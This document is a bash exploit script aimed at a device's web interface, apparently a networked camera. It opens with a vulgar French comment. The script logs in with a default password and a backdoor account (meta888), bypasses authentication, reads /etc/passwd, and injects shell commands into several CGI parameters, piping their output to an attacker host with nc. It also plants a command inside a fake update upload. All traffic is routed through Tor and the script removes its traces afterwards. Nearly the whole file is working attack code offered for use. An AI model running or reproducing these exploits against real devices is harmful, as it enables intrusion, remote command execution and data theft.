# Ta gueule Vlad, meme toi tu m'a dis qu'il était bien mon script, enculé va xD !

if [ $# -lt 2 ]; then
  echo "$0: Usage $0 http://TARGET Command (LHOST) (LPORT)"
  exit
fi

echo "Try to Loggin in V3.2.0 mode with default password"

cookie=$(torify curl -i -s -X POST "$1/cgi-bin/login.cgi" --data "password=123456" | grep "Set-Cookie" | grep -o -P '(?<=").*(?=";)')


if [[ $cookie = *"Logged In"* ]]; then
  echo "Here's the cookie : " $cookie

  echo "Let's try to Execute commands"
  echo "Writing payload ... "

  torify curl -s --cookie \"$cookie\" -X POST "$1/cgi-bin/newSetNetwork3D.cgi" --data "[{\"Name\":\"ServerIP\",\"Value\":\"http://127.0.0.1;$2\"}]" 

  echo "Executing payload ... "
  echo "---------- Command output ----------"

  torify curl "$1/cgi-bin/checkPower.py"

  echo "---------- End Command output ----------"


  echo "Cleaning  ... "

  torify curl -s --cookie \"$cookie\" -X POST "$1/cgi-bin/newSetNetwork3D.cgi" --data "[{\"Name\":\"ServerIP\",\"Value\":\"https://www.footballcam.com\"}]" 
  exit

else

   echo "Can't Loggin in V3.2.0 mode"
   echo " "

fi


echo "Try to Loggin in V3.2.2 mode with default password"

cook=$(torify curl -i -s -X POST "$1/cgi-bin/login.cgi" --data "password=123456" | grep "Logged" | awk 'NF{ print $NF }' | head -c 17 | tail -c 8 )

if [ -z "$cook"]; then

    echo "Can't Loggin in V3.2.2 mode with default"

else

   echo "Here's the cookie : key-$cook=00000000$cook" 
fi


echo " "


echo "Try to Loggin in V3.2.2 mode with the backdoor account (meta888)"

cooks=$(torify curl -i -s -X POST "$1/cgi-bin/login.cgi" --data "password=meta888" | grep "Logged" | awk 'NF{ print $NF }' | head -c 17 | tail -c 8 )

if [ -z "$cooks"]; then

    echo "Can't Loggin in V3.2.2 mode with backdoor account"

else

   echo "Here's the cookie : key-$cooks=00000000$cooks" 

   resp=$(torify curl -s "$1/cgi-bin/getWizardHomeSetting.cgi" --cookie "key-$cooks=00000000$cooks")

   if [[ $resp = *"firstTimeName"* ]]; then
      echo "Auth Bypassed !"
   fi

echo " "
fi


echo " "



echo "Try to Bypass Auth V3.2.2"

bypass=$(torify curl -s "$1/cgi-bin/getCookieSetting.py" | head -c 28 | tail -c 8)


echo "Here's the bypass cookie : key-$bypass=00000000$bypass"


resp2=$(torify curl -s "$1/cgi-bin/getWizardHomeSetting.cgi" --cookie "key-$bypass=00000000$bypass")

if [[ $resp2 = *"firstTimeName"* ]]; then
   echo "Auth Bypassed !"
fi

echo " "

echo "Try to ReadFile"
echo " "

torify curl "$1/cgi-bin/apiAction.cgi?url=file:///etc/passwd" 

echo " "

echo "Let's try to Execute commands via arping.cgi and store output in a file (Need file read to get output)"
echo "Executing payload ... "

torify curl -s "$1/cgi-bin/arping.cgi?ipAddr=\$($2 > /tmp/lel1337)" >/dev/null

echo "Read output ... "
echo "---------- Command output ----------"

torify curl "$1/cgi-bin/apiAction.cgi?url=file:///tmp/lel1337" 

  echo "---------- End Command output ----------"

echo "Cleaning ... "

torify curl -s "$1/cgi-bin/arping.cgi?ipAddr=\$(echo \" \" > /tmp/lel1337)" >/dev/null

echo " "

if [ $# -lt 4 ]; then
  echo "$0: You need to setup (LHOST) and (LPORT) for netcat-based RCE"
  exit
fi

echo "Let's try to Execute commands via arping.cgi and send output via netcat (You need to set up a listener first)"



echo "Output will be sent to $3:$4"
echo "Executing payload ... "
torify curl -s "$1/cgi-bin/arping.cgi?ipAddr=\$($2 | nc $3 $4)" >/dev/null
sleep 2


echo " "

echo "Let's try to Execute commands via getIOUsage.cgi and send output via netcat (You need to set up a listener first)"
echo "Output will be sent to $3:$4"
echo "Executing payload ... "

torify curl -s "$1/cgi-bin/getIOUsage.cgi?name=\$($2 | nc $3 $4)" >/dev/null
sleep 2
echo " " 

echo "Let's try to Execute commands via getMemoryUsage.cgi  and send output via netcat (You need to set up a listener first)"
echo "Output will be sent to $3:$4"
echo "Executing payload ... "

torify curl -s "$1/cgi-bin/getMemoryUsage.cgi?name=\$($2 | nc $3 $4)" >/dev/null
sleep 2
echo " "

echo "Let's try to Execute commands via getPerformance.cgi  and send output via netcat (You need to set up a listener first)"
echo "Output will be sent to $3:$4"
echo "Executing payload ... "


torify curl -s "$1/cgi-bin/getPerformance.cgi?name=\$($2 | nc $3 $4)" >/dev/null
sleep 2
echo " "

echo "Let's try to Execute commands via newSetNetwork3D.cgi proxyip and send output via netcat (You need to set up a listener first)"
echo "Output will be sent to $3:$4"
echo "Executing payload ... "

timeout 10 torify curl -s -X POST "$1/cgi-bin/newSetNetwork3D.cgi" -H "Content-Type: application/x-www-form-urlencoded" --data "allValues=[{\"Name\":\"isProxy\",\"Value\":\"on\"},{\"Name\":\"proxyip\",\"Value\":\"\$($2 | nc $3 $4)\"},{\"Name\":\"proxyport\",\"Value\":\"\"}]" >/dev/null
sleep 2
echo " "

echo "Let's try to Execute commands via uploadUpdate.cgi and send output via netcat (You need to set up a listener first)"
echo "Output will be sent to $3:$4"


echo "Crafting payload..."
echo "$2 | nc $3 $4" > run.sh

zip hey.zip run.sh

echo "Executing payload ... "
timeout 10 torify curl -s -X POST "$1/cgi-bin/uploadUpdate.cgi" -F 'file=@hey.zip' -F ' =undefined' >/dev/null
sleep 2
echo "Cleaning Remote and Local Files.."
echo " " > run.sh
zip hey.zip run.sh

timeout 10 torify curl -s -X POST "$1/cgi-bin/uploadUpdate.cgi" -F 'file=@hey.zip' -F ' =undefined'  >/dev/null
sleep 2
rm run.sh
rm hey.zip

echo " "
echo "That's all Folks"
